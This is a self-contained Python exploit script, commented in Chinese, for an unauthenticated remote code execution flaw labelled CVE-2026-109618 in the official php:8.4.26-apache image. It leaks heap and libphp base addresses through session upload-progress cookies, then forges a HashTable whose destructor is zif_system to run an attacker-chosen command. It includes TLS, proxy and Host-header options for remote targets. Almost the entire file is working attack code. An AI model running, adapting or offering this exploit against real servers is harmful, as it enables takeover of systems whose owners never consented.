#!/usr/bin/env python3
"""
php2shell_rce —— CVE-2026-109618 完整未认证 RCE（keep-alive 三阶段，自包含 socket）。

针对 php:8.4.26-apache（Debian bookworm）官方镜像 + memory_limit=8M +
session.upload_progress.enabled=1 + 存在 session_start() 消费点。

流程：
  Stage-1  泄漏 Zend MM 堆基址 chunk_base（2MB 对齐）
  Stage-2  泄漏 libphp 基址（pDestructor=zval_ptr_dtor）
  Stage-3  rotate 获干净 worker 后，伪造 HashTable(pDestructor=zif_system) 触发 RCE

用法：
  python3 php2shell_rce.py -u http://127.0.0.1:8090/index.php \
      -c 'id>/out/p1' --proof-file /path/to/lab/out/p1 \
      --profile bookworm \
      [--zif-offset 0x465370 --dtor-offset 0x65eb60 --htdata-offset 0x690D8]

依赖：poc_eness/poc_109618.py（build_multipart/parse_cookie/chunk_base_from_cookie/
libphp_base_from_cookie/Exploit._file_part/_big_field/_fake_payload/rotate）。
"""
import sys, time, struct, argparse, os, socket, re, hashlib

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.join(HERE, '..', 'poc_eness'))
import poc_109618 as P

SID = b'attacksessionid0001'

# bookworm 符号偏移（nm libphp.so 验证）
ZIF_OFFSET = 0x465370      # zif_system（LOCAL）
DTOR_OFFSET = 0x65eb60     # zval_ptr_dtor（GLOBAL）
HTDATA_OFFSET = 0x690D8    # bookworm htdata 偏移

STAGE1_N = 841             # bookworm profile
STAGE2_T = 406             # 983 组嵌套数组中第 t 组
STAGE2_V = 16


# ---- TLS 开关（由上层按目标 scheme 设置；exploit 阶段全部走 _dial）----
TLS_STATE = {"enabled": False, "insecure": True, "server_hostname": None}

# ---- 公网链路参数：超时与 Host 头覆盖 ----
NET_STATE = {"timeout": 120.0, "host_header": None}


def set_net(timeout=None, host_header=None):
    """timeout 覆盖裸 socket 连接/读写；host_header 用于「访问 IP、vhost 认域名」。"""
    if timeout:
        NET_STATE["timeout"] = float(timeout)
    if host_header is not None:
        NET_STATE["host_header"] = host_header
    return dict(NET_STATE)


def set_tls(enabled, insecure=None, server_hostname=None):
    """打开/关闭 RCE 阶段的 TLS。insecure=True 时跳过证书校验（自签靶场必需）。"""
    TLS_STATE["enabled"] = bool(enabled)
    if insecure is not None:
        TLS_STATE["insecure"] = bool(insecure)
    if server_hostname:
        TLS_STATE["server_hostname"] = server_hostname
    return dict(TLS_STATE)


def get_tls():
    return dict(TLS_STATE)


def _maybe_tls(sock, host):
    if not TLS_STATE["enabled"]:
        return sock
    import ssl
    ctx = ssl.create_default_context()
    if TLS_STATE["insecure"]:
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
    return ctx.wrap_socket(sock, server_hostname=TLS_STATE["server_hostname"] or host)


def parse_target(url):
    from urllib.parse import urlparse
    u = urlparse(url)
    host = u.hostname or '127.0.0.1'
    https = (u.scheme or '').lower() == 'https'
    port = u.port or (443 if https else 80)
    path = u.path or '/'
    if https:
        set_tls(True)
        TLS_STATE["server_hostname"] = u.hostname or None
    else:
        set_tls(False)
    return host, port, path


def read_resp(sock, cap=1 << 22):
    """读一个 HTTP 响应（支持 Content-Length / chunked / 直到连接关闭）。"""
    data = b''
    while b'\r\n\r\n' not in data and len(data) < cap:
        chunk = sock.recv(65536)
        if not chunk:
            return data
        data += chunk
    head, _, body = data.partition(b'\r\n\r\n')
    if b'transfer-encoding: chunked' in head.lower():
        while True:
            line = b''
            while not line.endswith(b'\r\n'):
                c = sock.recv(1)
                if not c:
                    return data
                line += c
            size = int(line.strip().split(b';')[0], 16)
            if size == 0:
                try:
                    sock.recv(65536)
                except Exception:
                    pass
                return data
            while size > 0:
                c = sock.recv(min(size, 65536))
                if not c:
                    return data
                data += c
                size -= len(c)
            try:
                sock.recv(2)
            except Exception:
                pass
    else:
        cl = 0
        for line in head.split(b'\r\n'):
            if line.lower().startswith(b'content-length:'):
                cl = int(line.split(b':', 1)[1].strip())
        while len(body) < cl and len(data) < cap:
            chunk = sock.recv(min(65536, cl - len(body)))
            if not chunk:
                break
            body += chunk
        data = head + b'\r\n\r\n' + body
    return data


def raw_request(host, port, path, body, boundary, cookie=None, keep_alive=True):
    host_hdr = NET_STATE["host_header"] or f"{host}:{port}"
    hdr = (f"POST {path} HTTP/1.1\r\n"
           f"Host: {host_hdr}\r\n"
           f"User-Agent: {_ua()}\r\n"
           f"Accept: */*\r\n")
    if cookie:
        hdr += f"Cookie: {cookie}\r\n"
    hdr += (f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
            f"Content-Length: {len(body)}\r\n"
            f"Connection: {'keep-alive' if keep_alive else 'close'}\r\n\r\n")
    return hdr.encode() + body



def _ua() -> str:
    """UA 可被 -H "User-Agent: ..." 覆盖；默认保留可识别标识。"""
    h = getattr(P, "DEFAULT_HEADERS", None) or {}
    for k, v in h.items():
        if k.lower() == "user-agent":
            return str(v)
    return "php2shell-rce"


def _dial(host, port, timeout=None):
    """连接目标；设置了 P.DEFAULT_PROXY 时经单个代理（http CONNECT / socks5）。

    TLS_STATE.enabled 为真时（目标为 https）在此统一套一层 TLS，
    因此 stage1/2/3、keepalive_pair 等全部阶段自动获得 https 能力。
    """
    timeout = timeout or NET_STATE["timeout"]
    proxy = getattr(P, "DEFAULT_PROXY", None) if P is not None else None
    if proxy:
        t = P.Target("http://%s:%d/" % (host, port), timeout=timeout, verbose=False)
        sock = t._open_socket(timeout)
    else:
        sock = socket.create_connection((host, port), timeout=timeout)
    return _maybe_tls(sock, host)

def keepalive_pair(host, port, path, first, second, cap1, cap2, cookie1=None):
    """同一 TCP 连接发 污染A(first) → 解引用B(second)，返回 (respA, respB)。"""
    s = _dial(host, port)
    ba, bb = first
    s.sendall(raw_request(host, port, path, ba, bb, cookie=cookie1, keep_alive=True))
    r1 = read_resp(s, cap1)
    da, db = second
    s.sendall(raw_request(host, port, path, da, db, cookie=None, keep_alive=False))
    r2 = read_resp(s, cap2)
    try:
        s.close()
    except Exception:
        pass
    return r1, r2


def stage1_pair(ex):
    parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
    parts += [
        {"name": "PHPSESSID", "data": b"\x00"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ex._file_part(),
        ex._big_field(),
    ]
    bodyA = P.build_multipart(parts, b"S" * 17)

    parts2 = [
        {"name": "PHPSESSID", "data": SID},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    n = getattr(ex, 'stage1_n', STAGE1_N)
    for i in range(n):
        val = (f"v{i:04d}" + "x" * 44)[:48]
        parts2.append({"name": str(1000 + i), "data": val.encode()})
    forge = bytearray(b"A" * 79)
    struct.pack_into("<Q", forge, 0x10, 0x1000)
    forge[0x18] = ord("L")
    parts2.append({"name": "1999", "data": bytes(forge)})
    bodyB = P.build_multipart(parts2, b"B" * 10)
    return (bodyA, b"S" * 17), (bodyB, b"B" * 10)


def stage2_pair(ex, t=STAGE2_T, v=STAGE2_V):
    parts = [{"name": f"f{i:04d}"[:5], "data": b"x" * 39} for i in range(1001)]
    parts += [
        {"name": "PHPSESSID", "data": b"\x00"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ex._file_part(),
        ex._big_field(),
    ]
    bodyA = P.build_multipart(parts, b"S" * 17)

    parts2 = [
        {"name": "PHPSESSID", "data": SID},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    for i in range(983):
        cnt = v if i == t else 1
        for j in range(cnt):
            parts2.append({"name": f"a{i:04d}[{j}]", "data": b"x" * v})
    bodyB = P.build_multipart(parts2, b"B" * 10)
    return (bodyA, b"S" * 17), (bodyB, b"B" * 10)


def stage3_pair(ex, htdata, zif):
    parts = [
        {"name": "PHPSESSID", "data": b"a" * 19},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"p" * 3},
    ]
    pads = getattr(ex, 'stage3_pads', [(31, 31)] * 6)
    for i, (nl, vl) in enumerate(pads):
        name = (f"p{i:0{nl - 1}d}" if nl > 0 else "")[:nl]
        parts.append({"name": name, "data": b"V" * vl})
    parts += [ex._file_part(), ex._big_field()]
    bodyA = P.build_multipart(parts, b"S" * 17)

    ht, _ref = ex._fake_payload(htdata, zif)
    carrier = struct.pack("<II", 1, 0x1A) + struct.pack("<Q", htdata)[:7]
    parts2 = [
        {"name": "PHPSESSID", "data": SID},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    for i in range(2):
        parts2.append({"name": f"f{i:02d}", "data": b"F" * 15})
    parts2.append({"name": "g00", "data": carrier})
    for i in range(15):
        parts2.append({"name": f"a{i:030d}"[:31], "data": bytes(ht)})
    bodyB = P.build_multipart(parts2, b"B" * 10)
    return (bodyA, b"S" * 17), (bodyB, b"B" * 10)


def leak_chunk_base(host, port, path, ex, attempts=20):
    for i in range(attempts):
        first, second = stage1_pair(ex)
        try:
            r1, r2 = keepalive_pair(host, port, path, first, second, 1 << 20, 9 << 20)
        except Exception:
            time.sleep(0.2)
            continue
        raw = P.parse_cookie(r2)
        cb = P.chunk_base_from_cookie(raw)
        if cb:
            print(f"[Stage-1] 泄漏成功 chunk_base={hex(cb)} (raw={len(raw)}B)", flush=True)
            return cb
    return None


def leak_libphp_base(host, port, path, ex, t_pos=STAGE2_T, attempts=30):
    for i in range(attempts):
        first, second = stage2_pair(ex, t_pos)
        try:
            r1, r2 = keepalive_pair(host, port, path, first, second, 1 << 20, 1 << 20)
        except Exception:
            time.sleep(0.3)
            continue
        raw = P.parse_cookie(r2)
        base = P.libphp_base_from_cookie(raw, DTOR_OFFSET)
        if base:
            print(f"[Stage-2] 泄漏成功 libphp_base={hex(base)} (t={t_pos}, raw={len(raw)}B)", flush=True)
            return base
    return None


class ProofWatch:
    """只接受「本次运行创建/修改过、非空、且匹配 require」的 proof 文件。

    真实目标上 proof 是远端产物；本机路径只有在容器目录挂载时才可读。
    伪造成功最常见的来源是「路径上本来就有个旧文件」，因此必须比对运行前指纹。
    """

    def __init__(self, path, require=None):
        self.path = path
        self.re = re.compile(require.encode()) if require else None
        self.before = self._sig()

    def _sig(self):
        if not self.path:
            return None
        try:
            st = os.stat(self.path)
            with open(self.path, "rb") as f:
                head = f.read(1 << 20)
        except OSError:
            return None
        return (st.st_mtime_ns, st.st_size, hashlib.sha256(head).hexdigest())

    def hit(self):
        """返回 proof 内容 bytes；不成立返回 None。"""
        if not self.path:
            return None
        sig = self._sig()
        if sig is None or sig == self.before or sig[1] <= 0:
            return None
        try:
            with open(self.path, "rb") as f:
                data = f.read()
        except OSError:
            return None
        if self.re and not self.re.search(data):
            return None
        return data


def do_rce(host, port, path, ex, chunk_base, libphp_base, cmd, htdata_offset,
           zif_offset, proof_file, rounds=30, proof_require=None):
    htdata = chunk_base + htdata_offset
    zif = libphp_base + zif_offset
    watch = ProofWatch(proof_file, proof_require)
    print(f"[Stage-3] htdata={hex(htdata)} zif={hex(zif)} cmd={cmd!r}", flush=True)
    for i in range(rounds):
        try:
            ex.rotate()
        except Exception:
            pass
        time.sleep(1.2)
        first, second = stage3_pair(ex, htdata, zif)
        try:
            r1, r2 = keepalive_pair(host, port, path, first, second,
                                    1 << 22, 1 << 22, cookie1='PHPSESSID=' + 'a' * 32)
        except Exception as e:
            print(f"[{i}] keep-alive 异常 {type(e).__name__}: {e}", flush=True)
            time.sleep(0.3)
            continue
        oom = b'Fatal error' in r1 or b'memory' in r1.lower()
        print(f"[{i}] 污染A={len(r1)}B oom={oom} 解引用B={len(r2)}B", flush=True)
        data = watch.hit()
        if data is not None:
            print(f"[+] RCE 成功! proof={proof_file} ({len(data)}B，本次运行新写入)", flush=True)
            try:
                print(data.decode('latin1'), flush=True)
            except Exception:
                pass
            return True
        time.sleep(0.2)
    return False


def main():
    ap = argparse.ArgumentParser(description='CVE-2026-109618 三阶段 RCE（keep-alive 自包含）')
    ap.add_argument('-u', '--url', required=True)
    ap.add_argument('-c', '--cmd', default='id>/out/p1')
    ap.add_argument('--proof-file', default=None, help='RCE 后 proof 文件路径（主机侧，命中则停止）')
    ap.add_argument('--proof-require', default=None, metavar='REGEX',
                    help='proof 内容必须匹配的 regex（如 "uid=\\d+"）；不匹配不算成功')
    ap.add_argument('--profile', default='bookworm')
    ap.add_argument('--zif-offset', default=ZIF_OFFSET, type=lambda x: int(x, 0))
    ap.add_argument('--dtor-offset', default=DTOR_OFFSET, type=lambda x: int(x, 0))
    ap.add_argument('--htdata-offset', default=HTDATA_OFFSET, type=lambda x: int(x, 0))
    ap.add_argument('--stage1-n', default=STAGE1_N, type=int)
    ap.add_argument('--stage2-t', default=STAGE2_T, type=int)
    ap.add_argument('--rounds', default=30, type=int)
    ap.add_argument('--timeout', default=120.0, type=float,
                    help='裸 socket 连接/读写超时（公网高延迟/大 body 建议 ≥120）')
    ap.add_argument('--host-header', default=None,
                    help='覆盖 Host 头（按 IP 访问但 vhost 只认域名时用）')
    ap.add_argument('--skip-leak', action='store_true', help='跳过 Stage-1/2，需 --chunk-base/--libphp-base')
    ap.add_argument('--chunk-base', default=None, type=lambda x: int(x, 0))
    ap.add_argument('--libphp-base', default=None, type=lambda x: int(x, 0))
    args = ap.parse_args()

    if len(args.cmd.encode()) > 14:
        print('[!] cmd 不得超过 14 字节（PoC MAX_CMD 限制）')
        sys.exit(1)

    host, port, path = parse_target(args.url)
    set_net(timeout=args.timeout, host_header=args.host_header)
    if args.host_header:
        P.DEFAULT_HOST_HEADER = args.host_header
    ex = P.Exploit(P.Target(args.url, timeout=args.timeout, verbose=False), args.cmd,
                   zif_offset=args.zif_offset, dtor_offset=args.dtor_offset,
                   htdata_offset=args.htdata_offset, profile=args.profile, verbose=False)
    ex.stage1_n = args.stage1_n

    chunk_base = args.chunk_base
    libphp_base = args.libphp_base
    if not args.skip_leak:
        if chunk_base is None:
            chunk_base = leak_chunk_base(host, port, path, ex)
            if chunk_base is None:
                print('[!] Stage-1 泄漏失败')
                sys.exit(1)
        if libphp_base is None:
            libphp_base = leak_libphp_base(host, port, path, ex, args.stage2_t)
            if libphp_base is None:
                print('[!] Stage-2 泄漏失败')
                sys.exit(1)

    print(f'[*] chunk_base={hex(chunk_base)} libphp_base={hex(libphp_base)}', flush=True)
    ok = do_rce(host, port, path, ex, chunk_base, libphp_base, args.cmd,
                args.htdata_offset, args.zif_offset, args.proof_file, args.rounds,
                proof_require=args.proof_require)
    print('[结果] ' + ('RCE 成功' if ok else '未命中（可增加 --rounds 或检查偏移）'), flush=True)
    sys.exit(0 if ok else 2)


if __name__ == '__main__':
    main()
